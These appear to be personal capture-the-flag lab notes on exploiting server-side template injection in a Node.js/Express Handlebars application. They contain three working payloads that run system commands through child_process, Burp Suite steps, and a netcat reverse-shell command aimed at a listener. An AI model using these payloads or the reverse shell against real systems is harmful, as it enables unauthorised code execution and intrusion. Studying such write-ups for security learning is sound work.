- **==Node.js==** is an open-source, cross-platform, back-end JavaScript runtime environment that can be used to build scalable network applications. 
- **==Express==** is a minimal and flexible Node.js web application framework that provides a robust set of features for web and mobile applications.

Identify the Template being used by injecting a function to see Server response

==`{{7*7}}`==

We saw that we are submitting information via POST request. 

Capture request in ==**Burpsuite**== to modify

![[Pasted image 20240513214833.png]]

Send to **Repeater**

Now we can use HackTricks payload to exploit the backend code.

This will spawn a child process and execute ==`whoami`== command.

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

But first, send put code in **==Burpsuit Decoder==** to **URL Encode**


![[Screenshot 2024-05-13 at 9.56.17 PM.png]]

Paste URL in email field for **Repeater**

This will ultimately need to be researched further. I needed the walkthrough to guide me on how to call global variables etc.

Essentially modifying the require function to call deprecated modules that will perform system level calls for us to exploit in our payloads


```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

We have successfully loaded the mainModule.require object and module.

Modify to call ==`whoami`==

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

List directories using this method

==`ls /root`==

- Tried to gain a reverse shell using ==`nc <Target_IP_Listener> <Target_Port> -e /bin/bash`== but received an error that `-e` was not a valid option. Try these workarounds
